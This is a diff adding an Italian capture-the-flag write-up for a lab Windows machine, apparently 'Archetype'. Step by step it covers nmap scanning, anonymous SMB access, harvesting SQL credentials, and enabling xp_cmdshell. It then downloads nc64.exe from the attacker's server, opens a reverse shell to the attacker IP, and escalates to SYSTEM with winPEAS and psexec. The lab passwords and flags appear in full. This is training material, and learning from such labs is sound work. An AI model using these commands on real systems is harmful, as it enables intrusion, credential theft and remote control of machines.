@@ -1,0 +1,257 @@
+IP: 10.129.82.8
+---------
+scansiono con nmap le porte aperte con script e versione
+
+nmap 10.129.82.8 -sC -sV
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 03:54 EDT
+Nmap scan report for 10.129.82.8
+Host is up (0.054s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+|_ssl-date: 2022-07-05T07:54:50+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2022-07-05T07:52:01
+|_Not valid after:  2052-07-05T07:52:01
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2022-07-05T07:54:44
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-07-05T00:54:42-07:00
+| ms-sql-info: 
+|   10.129.82.8:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
+----------------
+uso il tool smbclient per cercare di accedere -N non specifica la password e -L guardo i servizi disponibili nel server
+
+smbclient -N -L \\\\10.129.82.8\\
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+Unable to connect with SMB1 -- no workgroup available
+
+vedo delle cartelle condivise alle quali posso provare ad accedere
+----------------------
+smbclient -N  \\\\10.129.82.8\\ADMIN$ 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+                                                                                                                    
+smbclient -N  \\\\10.129.82.8\\C$    
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+ADMIN$ e C$ danno accesso negato, mentre backups funziona
+
+smbclient -N  \\\\10.129.82.8\\backups
+Try "help" to get a list of possible commands.
+smb: \> 
+-------------------
+vedo la presenza di un file e lo scarico
+
+smb: \> dir
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+                5056511 blocks of size 4096. 2623565 blocks available
+smb: \> get prod.dtsConfig 
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
+-------------------
+all'interno del file vedo una riga che contiene username e password per un servizio sql
+
+<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+
+Password=M3g4c0rp123, Host=ARCHETYPE, User=sql_svc 
+--------
+per connetermi scarico e installo imoacket da github, all'interno della cartella impacket/example eseguo il file mssqlclient.py
+---------------
+specifico la flag -windows-auth in quanto mi sto connetendo ad una piattaforma windows, le credenziali uso quelle trovate nel file
+
+python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.82.8 -windows-auth 
+Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> 
+
+mi sono connesso al servizio sql
+-------------
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+-----------
+controllo il ruolo dell'account all'interno del server 
+
+SQL> SELECT is_srvrolemember('sysadmin');
+              
+          1  
+
+1 come risultato significa vero
+-----------------
+ora all'interno del secondo link cerco come eseguire dei comandi e trovo queste informazioni
+
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+
+ora procedo come scritto sopra, vedo che non è attivo il servizio e procedo ad attivaro, ora posso posso eseguire i comandi attraverso xp_cmdshell "comando"
+---------------
+ora posso creare una reverse shell da caricare all'interno della macchina, scarico nc64.exe ("windwos lo riconosce come virus pssword="123456789")
+-------------
+avvio un server http e un netcat listener con i seguenti comandi in due terminali separati
+
+sudo python3 -m http.server 80
+sudo nc -lvnp 443
+---------------
+sfrutto sul target la powershell con la seguente sintassi xp_cmdshell "powershell -c command"
+-----------
+stampo la cartella corrente  per sapere dove caricare il file
+
+SQL> xp_cmdshell "powershell -c pwd"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+NULL                                                                               
+
+Path                                                                               
+
+----                                                                               
+
+C:\Windows\system32    
+-----------------
+dato che mi trovo in una cartella di sistema e senza privilegi di root non posso caricare nessun file, allora mi sposto in una cartella a caso in cui posso, Downloads per esempio e carico il file (mio ip 10.10.16.58)
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.58/nc64.exe -outfile nc64.exe"
+
+nel terminale dove ho avviato il server http posso verificare l'upload perche si visualizza questa scritta
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.82.8 - - [05/Jul/2022 04:48:05] "GET /nc64.exe HTTP/1.1" 200 -
+-----------------
+ora esegue il file caricato sul target e specifico di eseguire la reverse shell sul mio ip in modo che nc la catturi
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.58 443"
+
+nel terminale di nc visualizzo la schell 
+connect to [10.10.16.58] from (UNKNOWN) [10.129.82.8] 49677
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sql_svc\Downloads>
+-------------------
+sotto il desktop posso trovare la flag user.txt
+3e7b102e78218e935bf3f4951fec21a3
+------------
+Per il privilege escalation uso un tool chiamato winPEAS scarico da github
+--------------
+sul target carico il file come prima ma questa volta dalla shell, viene caricato nella cartella corrente
+
+powershell wget http://10.10.16.58/winPEASx64.exe -outfile winPEASx64.exe
+
+il server mi segnala il caricamento avvenuto
+
+10.129.82.8 - - [05/Jul/2022 04:58:31] "GET /winPEASx64.exe HTTP/1.1" 200 -
+------------
+ora eseguo WinPEAS tramite powershell
+
+C:\Users\sql_svc\Desktop>winPEASx64 
+
+mi restituisce tutta una serie di informazio tra cui la più interessante riguarda la cronologia della powershell
+
+Analyzing Windows Files Files (limit 70)
+    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+-----------
+apro il file
+
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+
+trovo le credenziali dell'admin user:administrator password:MEGACORP_4dm1n!!
+--------------
+uso un'altro tool di psexec oer creare ua shell da amminstratore
+
+python3 psexec.py administrator@10.129.82.8
+Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.82.8.....
+[*] Found writable share ADMIN$
+[*] Uploading file RApjCEZV.exe
+[*] Opening SVCManager on 10.129.82.8.....
+[*] Creating service nSSi on 10.129.82.8.....
+[*] Starting service nSSi.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+
+mi si apre una shell da amministratore
+
+C:\Windows\system32> whoami
+nt authority\system
+----------------
+navigo fino a scoprire la root flag sul desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/27/2021  02:30 AM    <DIR>          .
+07/27/2021  02:30 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,712,064,000 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+b91ccec3305e98240082d4474b848528
+
+
+
+
